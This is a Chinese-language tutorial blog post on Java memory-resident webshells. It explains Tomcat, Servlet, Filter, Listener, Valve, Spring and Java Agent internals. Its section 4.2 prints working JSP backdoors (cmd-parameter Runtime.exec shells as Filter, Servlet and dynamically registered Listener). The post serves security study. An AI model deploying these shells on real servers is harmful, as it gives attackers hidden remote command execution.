---
title: Java 内存马第一篇 - 基础
date: 2025-11-08T15:00:00+08:00
tags:
  - "java安全"
  - "内存马"
categories:
  - "Java安全"
description: Java 内存马第一篇 - 基础
showToc: true
draft: false
tocOpen: true
---
# Java 内存马第一篇 - 基础





# 一、基础：

## 1. 什么是内存马

无文件的 webshell

> <font style="color:rgb(0, 0, 0);">内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识</font><font style="color:rgb(0, 0, 0);">别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。</font>

## 2. 内存马分类：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506693.png)

## 3. Tomcat 基础

### 3.1 Tomcat 架构

#### 3.1.1 Tomcat 架构

**<font style="color:rgb(51, 51, 51);">Tomcat 是Web应用服务器,是一个Servlet/JSP容器</font>**<font style="color:rgb(51, 51, 51);">，基本框架如下图所示，主要有server、service、connector、container。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508073.jpeg)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506316.jpeg)



**Server：**

代表整个 Tomcat 服务器。

一个 Tomcat 只有一个 Server，Server 中包含至少一个 Service 组件。

**Service：**

Service 主要是为了关联 Connector 和 Container，同时会初始化它下面的其它组件，在 Connector 和 Container 外面多包一层，把它们组装在一起，向外面提供服务，

一个 Service 可以设置多个 Connector，但只能有一个 Container 容器。

**Connector：**

Connector 负责接收浏览器发过来的 tcp 连接请求，创建一个 Request 和 Response 对象分别用于和请求端交换数据，然后会产生一个线程来处理这个请求并把产生的 Request 和 Response 对象传给处理这个请求的线程。这里Tomcat中一个Connector对应了一个请求，所以service容器中可以同时有多个connector对象。

简单来说就是Connector将在某个指定的端口上来监听客户的请求，将 socket 连接封装成 request 和 response 对象，后续交给 Container （Engine）来处理，并从Engine处获得响应并返回给客户端。  
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508086.jpeg)



Connector是使用protocolHandler来处理具体的请求（不同的protocolHandler代表不同的连接类型）。

而每种protocolHandler都使用了各自的3个重要组件来具体处理请求：

-Endpoint：用于处理底层Socket连接（nio和nio2实现的是TCP/IP协议，Apr实现的是SSL/TLS协议）；

-Processer：用于将Endpoint接收到的Socket封装成Request（实现HTTP协议或websocket协议或AJP协议）；

-Adapter：用于将封装好的Request交给Container（将请求适配到servlet容器）。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507251.jpeg)

**<font style="color:rgb(51, 51, 51);">Container（又名Catalina）：</font>**

<font style="color:rgb(51, 51, 51);">Container容器则是负责封装和管理Servlet 处理用户的servlet请求，并返回对象给web用户的模块。</font>

<font style="color:rgb(51, 51, 51);">Tomcat中有四种类型的Servlet容器，从上到下分别是 Engine、Host、Context、Wrapper。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507920.jpeg)

Engine：表示整个 Catalina 的 Servlet 引擎，用来管理多个虚拟站点，一个 Service 最多只能有一Engine，但是一个引擎可包含多个 Host；

Host：代表一个虚拟主机，或者说一个站点，可以给 Tomcat 配置多个虚拟主机地址，而一个虚拟主机下可包含多个 Context；

Context：表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper；

Wrapper：表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等



#### <font style="color:rgba(0, 0, 0, 0.85);">3.1.2 Tomcat和Servlet的关系</font>

**Tomcat 是Web应用服务器，是一个Servlet/JSP容器**，而Servlet容器从上到下分别是 Engine、Host、Context、Wrapper。

Engine：实现类为 org.apache.catalina.core.StandardEngine

Host：实现类为 org.apache.catalina.core.StandardHost

Context：实现类为 org.apache.catalina.core.StandardContext

Wrapper：实现类为 org.apache.catalina.core.StandardWrapper

<font style="color:rgb(51, 51, 51);">在Tomcat中Wrapper代表一个独立的servlet实例，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化），同时其从ContainerBase类继承过来，表示他是一个容器，只是他是最底层的容器，不能再含有任何的子容器了，且其父容器只能是context。而我们在也就是需要在这里去载入我们自定义的Servlet加载我们的内存马。</font>





#### <font style="color:rgb(0, 0, 0);">3.1.3 Tomcat工作机制动画演示</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508199.gif)


### 3.2 Servlet

#### <font style="color:rgb(31, 35, 40);">3.2.1 什么是servlet</font>

<font style="color:rgb(31, 35, 40);">Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。</font>



**<font style="color:rgb(31, 35, 40);">servlet 架构：</font>**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508008.jpeg)



#### <font style="color:rgb(31, 35, 40);">3.2.2 请求的处理过程</font>

<font style="color:rgb(31, 35, 40);">客户端发起一个http请求，比如get类型。</font>

<font style="color:rgb(31, 35, 40);">Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest 和  HttpServletResponse对象。</font>

<font style="color:rgb(31, 35, 40);">Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。</font>

<font style="color:rgb(31, 35, 40);">Servlet容器调用service()方法。</font>

<font style="color:rgb(31, 35, 40);">service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。</font>

<font style="color:rgb(31, 35, 40);">doXXX方法中是我们自己写的业务逻辑。</font>

<font style="color:rgb(31, 35, 40);">业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。</font>

<font style="color:rgb(31, 35, 40);">容器关闭时候，会调用destory方法</font>

#### <font style="color:rgb(31, 35, 40);">3.2.3 servlet生命周期</font>

<font style="color:rgb(31, 35, 40);">1）服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(ServletConfig conf)。</font>

<font style="color:rgb(31, 35, 40);">2）servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行</font>

<font style="color:rgb(31, 35, 40);">3）服务器关闭时，销毁这个servlet对象，执行destroy()方法。</font>

<font style="color:rgb(31, 35, 40);">4）由JVM进行垃圾回收。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508795.png)

### 3.3 Filter

#### <font style="color:rgb(31, 35, 40);">3.3.1 简介</font>

<font style="color:rgb(31, 35, 40);">filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508866.png)



#### <font style="color:rgb(31, 35, 40);">3.3.2 基本工作原理</font>

<font style="color:rgb(31, 35, 40);">1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。</font>

<font style="color:rgb(31, 35, 40);">2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。</font>

<font style="color:rgb(31, 35, 40);">3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。</font>

<font style="color:rgb(31, 35, 40);">4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。</font>

<font style="color:rgb(31, 35, 40);">5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。</font>

<font style="color:rgb(31, 35, 40);">6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。</font>

#### <font style="color:rgb(31, 35, 40);">3.3.3 filter的生命周期</font>

<font style="color:rgb(31, 35, 40);">与servlet一样，Filter的创建和销毁也由web容器负责。web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。 Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</font>

#### <font style="color:rgb(31, 35, 40);">3.3.4 filter链 </font>

<font style="color:rgb(31, 35, 40);">当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508459.png)

<font style="color:rgb(31, 35, 40);"></font>

### **<font style="color:rgb(31, 35, 40);">3.4 Listener</font>**

#### <font style="color:rgb(31, 35, 40);">3.4.1 简介</font>

<font style="color:rgb(31, 35, 40);">JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</font>

**<font style="color:rgb(31, 35, 40);">ServletContextListener</font>**<font style="color:rgb(31, 35, 40);">：对Servlet上下文的创建和销毁进行监听； </font>

**<font style="color:rgb(31, 35, 40);">ServletContextAttributeListener</font>**<font style="color:rgb(31, 35, 40);">：监听Servlet上下文属性的添加、删除和替换；</font>

**<font style="color:rgb(31, 35, 40);">HttpSessionListener</font>**<font style="color:rgb(31, 35, 40);">：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。</font>

**<font style="color:rgb(31, 35, 40);">HttpSessionAttributeListener</font>**<font style="color:rgb(31, 35, 40);">：对Session对象中属性的添加、删除和替换进行监听；</font>

**<font style="color:rgb(31, 35, 40);">ServletRequestListener</font>**<font style="color:rgb(31, 35, 40);">：对请求对象的初始化和销毁进行监听； </font>

**<font style="color:rgb(31, 35, 40);">ServletRequestAttributeListener</font>**<font style="color:rgb(31, 35, 40);">：对请求对象属性的添加、删除和替换进行监听。</font>

<font style="color:rgb(31, 35, 40);"></font>

<font style="color:rgb(0, 0, 0);">在应用中可能调用的监听器如下：</font>

+ <font style="color:rgb(0, 0, 0);">ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</font>
+ <font style="color:rgb(0, 0, 0);">ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</font>
+ <font style="color:rgb(0, 0, 0);">ServletRequestListener：对 Request 请求进行监听（创建、销毁）</font>
+ <font style="color:rgb(0, 0, 0);">ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</font>
+ <font style="color:rgb(0, 0, 0);">javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</font>
+ <font style="color:rgb(0, 0, 0);">javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</font>

#### <font style="color:rgb(31, 35, 40);">3.4.2 用途</font>

<font style="color:rgb(31, 35, 40);">可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</font>

### 3.5 Tomcat内存马

Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。

而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖



```xml
<dependency>
  <groupId>org.apache.tomcat</groupId>
  <artifactId>tomcat-catalina</artifactId>
  <version>9.0.105</version>
</dependency>
```



### 3.6 Tomcat 的管道机制

#### 3.6.1 Tomcat中的`管道机制`

> 我们知道，当Tomcat接收到客户端请求时，首先会使用`Connector`进行解析，然后发送到`Container`进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。
>
> 管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508670.png)
>
> 在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。



#### 3.6.2 管道机制流程分析

我们先来看看Pipeline接口，其继承了Contained接口，并且实现了很多对 Valve 的操作方法



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509796.png)

跟进查看 Valve 接口：

其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508325.jpeg)

同时Valve可以通过重写`invoke()`方法来实现具体的业务逻辑

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509163.png)





下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在`org.apache.catalina.connector.CoyoteAdapter#service`方法中  

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508440.png)

前面是对Request和Respone对象进行一些判断及创建操作，我们重点来看一下

`connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)`

首先通过`connector.getService()`来获取一个StandardService对象

接着通过`StandardService`.`getContainer().getPipeline()`获取`StandardPipeline`对象。

再通过`StandardPipeline.getFirst()`获取第一个Valve

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508076.png)



 最后通过调用`StandardEngineValve.invoke()`来实现Valve的各种业务逻辑  

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509410.png)

`host.getPipeline().getFirst().invoke(request, response)`实现调用后续的Valve。  



## 4. JSP

### 4.1 什么是 JSP：

JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动`println`一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。

JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。

当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。



### 4.2 恶意类：

#### <font style="color:rgb(80, 80, 92);">JSP 的无回显的内存马：</font>

最简单的 JSP 命令执行后门，但是命令执行的输出流（InputStream）未被读取或写回 HTTP 响应所以无回显。

```java
<% Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

改进为带回显：

```java
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
    Scanner s = new Scanner(in).useDelimiter("\\A");
    String output = s.hasNext() ? s.next() : "";
    out.println(output);
}
%>
```





#### <font style="color:rgb(80, 80, 92);">有回显的 Filter 木马：</font>

<font style="color:rgb(80, 80, 92);"></font>

```java
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
  
<%!
    public class ShellFilter implements Filter {
        public void destroy() {
        }

        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
            HttpServletRequest req = (HttpServletRequest) request;
            HttpServletResponse resp = (HttpServletResponse) response;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                resp.getWriter().write(output);
                resp.getWriter().flush();
            }
            chain.doFilter(request, response);
        }

        public void init(FilterConfig config) throws ServletException {

        }

    }
%>
```

#### 有回显的 Servlet 木马：

```java
<%@ page import="java.io.*" %>

<%!
    public class MemServlet extends HttpServlet {
        private String message;

        public void init() {
            message = "Hello World!";
        }

        // 计算机弹出
        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            Runtime.getRuntime().exec("calc");
        }

        public void destroy() {
        }

        // MemShell?cmd=whoami  任意命令执行
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd !=null){
                try{

                    Process process = Runtime.getRuntime().exec(cmd);
                    InputStream inputStream = process.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    while ((line = bufferedReader.readLine()) != null){
                        res.getWriter().println(line);
                    }
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
    }
%>
```



#### 无回显的 Listener 木马：

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%--
  Created by IntelliJ IDEA.
  User: XVSHIFU
  Date: 2025/11/2
  Time: 16:24
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>

<%!
    public class ShellListener implements ServletRequestListener {
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
         }
        public void requestDestroyed(ServletRequestEvent sre){
        }
    }
%>

<%
    // 1. 获取 StandardContext 类
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();

    // 2. 添加监听器
    ShellListener shellListener = new ShellListener();
    context.addApplicationEventListener(shellListener);
%>

</body>
</html>
```



## 5. Spring 基础


<font style="background-color:#FBDE28;">总结一句话：Spring就是一个轻量级的控制反转（IOC）和面向切面编程（AOP）的框架</font>



### 5.1 什么是Spring

Spring是一个轻量级的Java开源框架，用于配置、管理和维护Bean（组件）的一种框架，其核心理念就是**IoC(Inversion of Control,控制反转)** 和 **AOP(AspectOrientedProgramming， 面向切面编程)**。现如今Spring全家桶已是一个庞大的家族

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509336.webp)

Spring的出现大大简化了JavaEE的开发流程，减少了Java开发时各种繁琐的配置。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508481.webp)

Spring框架的核心之一就是分层，其由许多大大小小的组件构成，每种组件都实现不同功能。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509118.webp)

### 5.2 SpringBoot

<font style="color:rgba(0, 0, 0, 0.9);">Spring Boot 基于 Spring 开发，Spirng Boot 本身并不提供 Spring 框架的核心特性以及扩展功能，只是用于快速、敏捷地开发新一代基于 Spring 框架的应用程序。也就是说，它并不是用来替代 Spring 的解决方案，而是和 Spring 框架紧密结合用于提升 Spring 开发者体验的工具。Spring Boot 以</font>**<font style="color:rgba(0, 0, 0, 0.9);">约定大于配置的核心思想</font>**<font style="color:rgba(0, 0, 0, 0.9);">，默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置。同时它集成了大量常用的第三方库配置（例如 Redis、MongoDB、Jpa、RabbitMQ、Quartz 等等），Spring Boot 应用中这些第三方库几乎可以零配置的开箱即用。</font>

<font style="color:rgba(0, 0, 0, 0.9);">简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架 。</font>

**<font style="color:rgba(0, 0, 0, 0.9);">Spring Boot的主要优点：</font>**

+ <font style="color:rgba(0, 0, 0, 0.9);">为所有Spring开发者更快的入门</font>
+ **<font style="color:rgba(0, 0, 0, 0.9);">开箱即用</font>**<font style="color:rgba(0, 0, 0, 0.9);">，提供各种默认配置来简化项目配置</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">内嵌式容器简化Web项目</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">没有冗余代码生成和XML配置的要求</font>



## 6. java Agent 

### 6.1 什么是Java Agent？

Java是一种静态强类型语言，在运行之前必须将其编译成`.class`字节码，然后再交给JVM处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。

对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的`premain-Agent`，另一种是JVM启动之后加载的`agentmain-Agent`。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图

![premain-Agent](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508125.jpeg)



![agentmain-Agent](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508271.jpeg)





# 参考：

[【原创】利用“进程注入”实现无文件不死webshell](https://www.cnblogs.com/rebeyond/p/9686213.html)

[Java安全学习——内存马 - 枫のBlog](https://goodapple.top/archives/1355)

[Spring内存马 | CurlySean’s Blog](http://101.36.122.13:4000/2025/08/06/Spring内存马/#J9TFY)



[Java Agent实现反序列化注入内存shell](https://y4er.com/posts/javaagent-tomcat-memshell/#简述内存shell)

[JavaWeb 内存马一周目通关攻略 | 素十八](https://su18.org/post/memory-shell/)

[JavaWeb 内存马二周目通关攻略 | 素十八](https://su18.org/post/memory-shell-2/)

[Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com](https://www.4hou.com/posts/zlkq)

[Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/433972.html)

[Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客](https://hilang.cloud/java-内存马（四）：spring-boot-controller-内存马/)

[Spring型内存马分析](https://stoocea.github.io/post/Spring型内存马分析.html#2-Controller-型内存马)

[Servlet 简介 | 菜鸟教程](https://www.runoob.com/servlet/servlet-intro.html)

[Spring内存马学习](https://clowsman.github.io/2024/11/13/Spring内存马学习/index.html)

[Spring内存马——Controller/Interceptor构造](https://xz.aliyun.com/news/11493)

[基础篇 - Javassist 使用指南](https://changeyourway.github.io/2024/06/07/Java 安全/基础篇-javassist用法指南/)

[Java安全学习——ROME反序列化 - 枫のBlog](https://goodapple.top/archives/1145#header-id-20) （使用Javassist缩短恶意class）

[Java Agent实现反序列化注入内存shell](https://y4er.com/posts/javaagent-tomcat-memshell/)

[Agent内存马 | CurlySean’s Blog](http://101.36.122.13:4000/2025/08/05/JavaAgent内存马)